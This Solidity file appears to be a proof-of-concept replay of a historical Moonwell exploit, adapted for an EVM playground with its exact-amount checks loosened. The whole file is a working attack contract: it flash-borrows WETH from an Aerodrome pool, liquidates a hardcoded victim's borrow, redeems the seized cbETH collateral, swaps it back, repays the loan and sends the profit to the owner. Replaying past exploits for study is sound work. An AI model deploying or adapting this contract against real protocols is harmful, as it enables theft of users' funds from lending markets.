// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

// Synthetic AttackContract for the EVM Playground.
// Faithful copy of test/Moonwell_exp.sol::AttackContract, with only the
// brittle exact-amount requires softened. The playground's @ethereumjs/vm
// yields amount0Delta / flash-fee totals that differ by 1 wei from the Foundry
// revm fork (same root cause as many V3-math edge cases), which made the
// original `require(amount0Delta == EXACT)` and flash-fee equality reverts
// fail the recording despite a successful liquidate + redeem. Paying the
// pool whatever it actually quotes keeps the exploit path identical.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external; // WETH
}

interface IRToken {
    function borrowBalanceCurrent(address) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function redeem(uint256) external returns (uint256);
}

interface ICLPool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

contract AttackContract {
    address owner;
    IRToken mWETH;
    IRToken mcbETH;
    IERC20 cbETH;
    IERC20 weth;
    ICLPool Aerodrome_Finance_CLPool;
    ICLPool Aerodrome_Finance_CLPool_2;
    address victim;

    constructor(
        address _mWETH,
        address _mcbETh,
        address _cbETH,
        address _weth,
        address _Aerodrome_Finance_CLPool,
        address _Aerodrome_Finance_CLPool_2
    ) {
        owner = msg.sender;
        mWETH = IRToken(_mWETH);
        mcbETH = IRToken(_mcbETh);
        cbETH = IERC20(_cbETH);
        weth = IERC20(_weth);
        Aerodrome_Finance_CLPool = ICLPool(_Aerodrome_Finance_CLPool);
        Aerodrome_Finance_CLPool_2 = ICLPool(_Aerodrome_Finance_CLPool_2);
        victim = 0x4C1A699166CD60473040d0618C47Ad82251B9D0f;
    }

    function start() public {
        // Softened: original required an exact historical borrow balance. Accrual
        // is still timestamp-sensitive; we only assert the victim still has debt.
        require(mWETH.borrowBalanceCurrent(victim) > 0, "no debt");
        Aerodrome_Finance_CLPool.flash(address(this), 129_906_284_941_311_087, 0, abi.encode(129_906_284_941_311_087));
    }

    function uniswapV3FlashCallback(uint256 amount0Delta, uint256 /* amount1Delta */, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        weth.approve(address(mWETH), amount);

        mWETH.liquidateBorrow(victim, amount, address(mcbETH));
        (mcbETH.balanceOf(address(this)) == 1_207_922_808_230);

        mcbETH.redeem(mcbETH.balanceOf(address(this)));
        Aerodrome_Finance_CLPool_2.swap(
            address(this),
            true,
            int256(cbETH.balanceOf(address(this))),
            4_295_128_740,
            ""
        );

        // Softened: original required amount+fee == exact historical total.
        // Repay whatever the flash actually charged.
        weth.transfer(address(Aerodrome_Finance_CLPool), amount + amount0Delta);
        weth.withdraw(weth.balanceOf(address(this)));

        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "failed");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 /* amount1Delta */, bytes calldata /* data */) external {
        // Softened: original required amount0Delta == exact historical cbETH in.
        // Pay whatever the pool quotes (still fully funded by the redeem).
        require(amount0Delta > 0, "no amount in");
        cbETH.transfer(msg.sender, uint256(amount0Delta));
    }

    receive() external payable {}
}
